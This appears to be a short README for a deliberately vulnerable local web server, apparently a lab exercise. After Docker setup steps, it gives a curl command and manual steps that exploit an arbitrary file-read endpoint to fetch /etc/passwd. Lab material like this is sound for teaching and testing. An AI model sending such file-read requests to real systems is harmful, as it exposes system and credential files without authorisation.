## Setup 
1. git clone https://github.com/wbowm15/ubiquitous-eureka.git
2. cd ubiquitous-eureka
3. docker build -t server . 
4. docker run -p5000:5000 server

## Curl Exploit Command 
```
curl 'http://127.0.0.1:5000/get-file' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw 'filename=%2Fetc%2Fpasswd'
```

  ## Manual Exploit Steps 
  1. Enter /etc/passwd or another file in the "Enter a filename to fetch:" form and hit query
